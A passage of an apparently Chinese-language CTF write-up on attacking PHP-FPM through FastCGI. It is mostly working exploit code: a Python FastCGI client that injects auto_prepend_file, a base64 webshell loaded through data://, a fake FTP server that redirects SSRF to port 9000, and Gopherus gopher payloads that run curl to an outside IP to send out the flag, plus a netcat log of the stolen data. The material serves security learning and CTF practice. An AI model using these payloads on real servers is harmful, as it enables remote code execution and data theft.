class="hljs-keyword">return</span> self.__waitForResponse(requestId)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = self.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file = php://input&#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    response = client.request(params, content)<br>    <span class="hljs-built_in">print</span>(force_text(response))<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python fpm.py pwn.challenge.ctf.show -p 28230 /var/www/html/index.php -c &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>); <span class="hljs-keyword">exit</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>其中有一点需要注意，FPM在某版本后配置文件添加了<code>security.limit_extensions</code>选项，用于指定解析文件的后缀，并且默认值为.php，所以需要传入一个真实存在的php文件，否则会返回<code>Access denied.</code>或<code>File not found.</code></p><p>不过服务器上通常会存在一些php文件，可以用<code>find / -name &quot;*.php&quot;</code>来查找</p><h2 id="bypass-error-log"><a href="#bypass-error-log" class="headerlink" title="bypass-error_log"></a>bypass-error_log</h2><p>一般的攻击都是通过 auto_prepend_file ， auto_append_file 或者 extension 实现的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/usr|auto|extension|dir/i&#x27;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当部分内容被禁用时，就需要在php的设置中找到可以执行代码，或者包含文件，或者写文件的配置</p><p>其中 error_log 这个配置可以保存php的报错信息，并写入到文件中，但是会被实体编码，可以通过 html_errors 设置是否实体编码</p><p><code>&#39;PHP_VALUE&#39;: &#39;html_errors = Off\nerror_log = /var/www/html/1.php&#39;,</code></p><p>但是需要注意需要和有返回报错信息的函数互相配合使用，比如 fsockopen 函数</p><h2 id="bypass-内存马"><a href="#bypass-内存马" class="headerlink" title="bypass-内存马"></a>bypass-内存马</h2><p><code>&#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On\nauto_prepend_file = &quot;data://text/plain;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=&quot;&#39;</code></p><h1 id="通过FTP攻击php-fpm"><a href="#通过FTP攻击php-fpm" class="headerlink" title="通过FTP攻击php-fpm"></a>通过FTP攻击php-fpm</h1><p>有的时候php-fpm并没有绑定在0.0.0.0上，而是127.0.0.1或其他地址，这个时候就需要通过ssrf来攻击php-fpm</p><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>在上面的例子中，一般是可以写入shell的，但是在不能写入文件的情况下呢？</p><p>看file_put_contents在php手册中的定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span><br><br>(PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br>file_put_contents — 将数据写入文件<br><br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>,<br>    <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span>,<br>    ?resource <span class="hljs-variable">$context</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">int</span>|<span class="hljs-literal">false</span><br><br>和依次调用 <span class="hljs-title function_ invoke__">fopen</span>()，<span class="hljs-title function_ invoke__">fwrite</span>() 以及 <span class="hljs-title function_ invoke__">fclose</span>() 功能一样。<br></code></pre></td></tr></table></figure><p>首先调用了<code>fopen()</code>，而fopen可以打开文件或者 URL ，其中包括了<code>ftp://</code>协议</p><p>在ftp中，分为主动模式和被动模式。简单来说，主动模式是服务端的20端口去连接客户端的指定端口，被动模式是客户端连接服务端的指定端口。其中的区别就是在哪一端开放端口</p><p>既然这样，那我们可以模拟一个被动模式的ftp客户端，指定ip端口为<code>127.0.0.1:9000</code>，这样file_put_contents就会把数据包原封不动的传递给php-fpm，实现ssrf攻击fpm</p><p>模拟ftp的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">5566</span>))<br>s.listen(<span class="hljs-number">1</span>)<br>conn, addr = s.accept()<br>conn.send(<span class="hljs-string">b&#x27;220 welcome\n&#x27;</span>)<br><span class="hljs-comment">#Service ready for new user.</span><br><span class="hljs-comment">#Client send anonymous username</span><br><span class="hljs-comment">#USER anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;331 Please specify the password.\n&#x27;</span>)<br><span class="hljs-comment">#User name okay, need password.</span><br><span class="hljs-comment">#Client send anonymous password.</span><br><span class="hljs-comment">#PASS anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;230 Login successful.\n&#x27;</span>)<br><span class="hljs-comment">#User logged in, proceed. Logged out if appropriate.</span><br><span class="hljs-comment">#TYPE I</span><br>conn.send(<span class="hljs-string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)<br><span class="hljs-comment">#Size /</span><br>conn.send(<span class="hljs-string">b&#x27;550 Could not get the file size.\n&#x27;</span>)<br><span class="hljs-comment">#EPSV (1)</span><br>conn.send(<span class="hljs-string">b&#x27;150 ok\n&#x27;</span>)<br><span class="hljs-comment">#PASV</span><br>conn.send(<span class="hljs-string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="hljs-comment">#STOR / (2)</span><br>conn.send(<span class="hljs-string">b&#x27;150 Permission denied.\n&#x27;</span>)<br><span class="hljs-comment">#QUIT</span><br>conn.send(<span class="hljs-string">b&#x27;221 Goodbye.\n&#x27;</span>)<br>conn.close()<br></code></pre></td></tr></table></figure><p>通过Gopherus构造恶意payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lewiserii:~/Gopherus-master<span class="hljs-comment"># python2 gopherus.py --exploit fastcgi</span><br><br><br>  ________              .__<br> /  _____/  ____ ______ |  |__   ___________ __ __  ______<br>/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/<br>\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \<br> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;<br>        \/       |__|        \/     \/                 \/<br><br>                author: $_SpyD3r_$<br><br>Give one file name <span class="hljs-built_in">which</span> should be surely present <span class="hljs-keyword">in</span> the server (prefer .php file)<br><span class="hljs-keyword">if</span> you don<span class="hljs-string">&#x27;t know press ENTER we have default one:  index.php</span><br><span class="hljs-string">Terminal command to run:  curl http://47.99.77.52:5588/?a=`cat /f*`</span><br><span class="hljs-string"></span><br><span class="hljs-string">Your gopher link is ready to do SSRF:</span><br><span class="hljs-string"></span><br><span class="hljs-string">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------Made-by-SpyD3r-----------</span><br></code></pre></td></tr></table></figure><p>payload：</p><p>注意ftp协议的格式</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/?file<span class="hljs-operator">=</span>ftp://<span class="hljs-number">47.99</span>.<span class="hljs-number">77.52</span>:<span class="hljs-number">5566</span>/test&amp;content<span class="hljs-operator">=</span><span class="hljs-variable">%01</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%08</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%04</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%F6</span><span class="hljs-variable">%06</span><span class="hljs-variable">%00</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%10</span>SERVER_SOFTWAREgo<span class="hljs-variable">%20</span>/<span class="hljs-variable">%20</span>fcgiclient<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%09</span>REMOTE_ADDR<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%08</span>SERVER_PROTOCOLHTTP/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%02</span>CONTENT_LENGTH<span class="hljs-number">93</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%04</span>REQUEST_METHODPOST<span class="hljs-variable">%09</span>KPHP_VALUEallow_url_include<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>On<span class="hljs-variable">%0</span>Adisable_functions<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>Aauto_prepend_file<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>php<span class="hljs-variable">%3</span>A//input<span class="hljs-variable">%0</span>F<span class="hljs-variable">%09</span>SCRIPT_FILENAMEindex.php<span class="hljs-variable">%0</span>D<span class="hljs-variable">%01</span>DOCUMENT_ROOT/<span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%04</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%05</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%04</span><span class="hljs-variable">%00</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>curl<span class="hljs-variable">%20</span>http<span class="hljs-variable">%3</span>A//<span class="hljs-number">47.99</span>.<span class="hljs-number">77.52</span><span class="hljs-variable">%3</span>A<span class="hljs-number">5588</span>/<span class="hljs-variable">%3</span>Fa<span class="hljs-variable">%3</span>D<span class="hljs-variable">%60</span>cat<span class="hljs-variable">%20</span>/f<span class="hljs-variable">%2</span>A<span class="hljs-variable">%60</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>Bdie<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>-----Made-by-SpyD<span class="hljs-number">3</span>r-----<span class="hljs-variable">%0</span>A<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure><p>监听端口即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@dr0n1:~<span class="hljs-comment"># nc -lvvnp 5588</span><br>Listening on 0.0.0.0 5588<br>Connection received on 124.223.158.81 33340<br>GET /?a=ctfshowd99cc801-ca48-4632-9cec-c87db8594278 HTTP/1.1<br>Host: 47.99.77.52:5588<br>User-Agent: curl/7.61.1<br>Accept: */*<br><br><br></code></pre></td></tr></table></figure><p>FTP 仅起到了一个重定向 Payload 内容的作用</p><p><img src="/img/summary/php-fpm-1.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>]);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>], <span class="hljs-variable">$contents</span>);<br></code></pre></td></tr></table></figure><p>原理与上面是一样的，只不过将发送payload和重定向都放在了ftp上</p><p>第一次连接的时候返回通过Gopherus构造的payload，第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000</p><p>使用的时候注意修改payload和第一次返回的ip(第53行)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Time    : 2021/1/13 6:56 下午</span><br><span class="hljs-comment"># @Author  : tntaxin</span><br><span class="hljs-comment"># @File    : ftp_redirect.py</span><br><span class="hljs-comment"># @Software:</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><br><span class="hljs-comment"># 替换gopherus生成的payload</span><br>payload = unquote(<span class="hljs-string">&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0C%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;</span>)<br>payload = payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>port = <span class="hljs-number">5566</span>  <span class="hljs-comment"># 访问端口</span><br>sk = socket.socket()<br>sk.bind((host, port))<br>sk.listen(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment"># ftp被动模式</span><br>sk2 = socket.socket()<br>sk2.bind((host, <span class="hljs-number">5567</span>))  <span class="hljs-comment"># 二次访问端口</span><br>sk2.listen()<br><br><span class="hljs-comment"># 计数器，用于区分是第几次ftp连接</span><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    conn, address = sk.accept()<br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># USER aaa\r\n  客户端传来用户名</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;220 ready\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 ready\n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;215 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># SIZE /123\r\n  客户端询问文件/123的大小</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;213 3 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;300 \n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># EPSV\r\n&#x27;</span><br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 47,99,77,52,0,5567\n&quot;</span>)  <span class="hljs-comment"># vps第二次访问的ip和端口，与上面对应，注意是逗号分割</span><br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 127,0,0,1,0,9000\n&quot;</span>)  <span class="hljs-comment"># 重定向到9000</span><br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;125 \n&quot;</span>) <span class="hljs-comment"># 告诉客户端可以开始数据链接了</span><br>        <span class="hljs-comment"># 新建一个socket给服务端返回我们的payload</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;建立连接!&quot;</span>)<br>        conn2, address2 = sk2.accept()<br>        conn2.send(payload)<br>        conn2.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;断开连接!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;150 \n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))<br>        exit()<br><br>    <span class="hljs-comment"># 